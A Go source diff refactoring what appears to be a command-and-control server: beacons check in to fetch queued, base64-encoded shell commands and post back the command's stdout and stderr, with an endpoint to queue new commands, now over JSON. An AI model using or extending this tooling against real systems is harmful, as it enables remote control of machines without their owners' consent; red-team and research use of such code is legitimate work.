@@ -1,11 +1,9 @@
 package main
 
 import (
-	"encoding/base64"
 	"net/http"
 	"redbull/internal/rbhttp"
 	"redbull/internal/rbqueue"
-	"strings"
 
 	"github.com/go-chi/chi/v5"
 	"github.com/go-chi/chi/v5/middleware"
@@ -15,8 +13,7 @@ import (
 )
 
 var cmdQueue = rbqueue.NewQueue[string]()
-
- var responses = rbhttp.NewBeaconResponses()
+var responses = rbhttp.NewBeaconResponses()
 
 func init() {
 	logger := zap.Must(zap.NewDevelopment())
@@ -25,7 +22,7 @@ func init() {
 
 func errorResponse(w http.ResponseWriter, r *http.Request, status int, msg string) {
 	render.Status(r, status)
-	render.PlainText(w, r, msg)
+	render.JSON(w, r, rbhttp.ErrorResponse{Error: msg})
 }
 
 func checkIn(w http.ResponseWriter, r *http.Request) {
@@ -40,42 +37,36 @@ func checkIn(w http.ResponseWriter, r *http.Request) {
 	}
 
 	command, _ := cmdQueue.Pop()
-	encodedCmd := base64.StdEncoding.EncodeToString([]byte(command))
-	render.PlainText(w, r, encodedCmd)
+	encodedCmd := rbhttp.EncodeCommand(command)
+	render.JSON(w, r, rbhttp.CheckInResponse{Command: encodedCmd})
 }
 
 func response(w http.ResponseWriter, r *http.Request) {
-	responseData, err := rbhttp.ReadPlaintextBody(r)
+	httpBody, err := rbhttp.ReadJsonBody(r)
 	if err != nil {
 		zap.L().Error("response - read body", zap.Error(err))
-		errorResponse(w, r, 400, "invalid response format")
+		errorResponse(w, r, 400, err.Error())
 		return
 	}
 
-	groups := strings.Split(responseData, "\n\n")
-
-	command := groups[0]
-	stdout := groups[1]
-	stderr := groups[2]
-
-	responses.Append(*rbhttp.NewBeaconResponse(command, stdout, stderr))
+	responses.Append(*rbhttp.NewBeaconResponse(httpBody.Command, httpBody.Stdout, httpBody.Stderr))
 	render.Status(r, 204)
 	render.NoContent(w, r)
 }
 
 func newCommand(w http.ResponseWriter, r *http.Request) {
-	command, err := rbhttp.ReadPlaintextBody(r)
-	if err != nil {
-		zap.L().Error("newCommand - decode", zap.Error(err))
+	var newCommandRequest rbhttp.NewCommandRequest
+	if err := render.Bind(r, &newCommandRequest); err != nil {
+		zap.L().Error("newCommand - bind", zap.Error(err))
 		errorResponse(w, r, 400, "invalid command")
 		return
 	}
 
 	cmdQueue.Lock()
 	defer cmdQueue.Unlock()
-	cmdQueue.Append(command)
+	cmdQueue.Append(newCommandRequest.Command)
 	render.Status(r, 200)
-	render.PlainText(w, r, "queued")
+	render.JSON(w, r, rbhttp.NewCommandResponse{Success: true})
 }
 
 func fetchResponses(w http.ResponseWriter, r *http.Request) {
@@ -89,6 +80,7 @@ func main() {
 	r.Use(middleware.RealIP)
 	r.Use(middleware.Recoverer)
 	r.Use(middleware.URLFormat)
+	r.Use(render.SetContentType(render.ContentTypeJSON))
 	r.Use(cors.Handler(cors.Options{
 		// AllowedOrigins:   []string{"https://foo.com"}, // Use this to allow specific origin hosts
 		AllowedOrigins: []string{"https://*", "http://*"},
